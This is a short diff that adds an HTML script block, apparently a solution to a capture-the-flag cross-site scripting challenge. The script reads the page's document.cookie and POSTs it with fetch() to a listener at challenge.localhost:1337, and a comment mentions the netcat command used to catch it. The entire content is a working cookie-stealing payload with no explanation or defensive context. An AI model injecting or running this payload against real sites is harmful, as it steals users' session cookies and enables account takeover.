@@ -1,0 +1,9 @@
+<script>
+	let cookie = document.cookie;
+	let data = new URLSearchParams();
+	data.append('cookie',cookie);
+
+	let url = "http://challenge.localhost:1337" // a listener was setup (nc challenge.localhost -l 1337)
+	let options = {method:"POST", body:data};
+	fetch(url, options);
+</script>
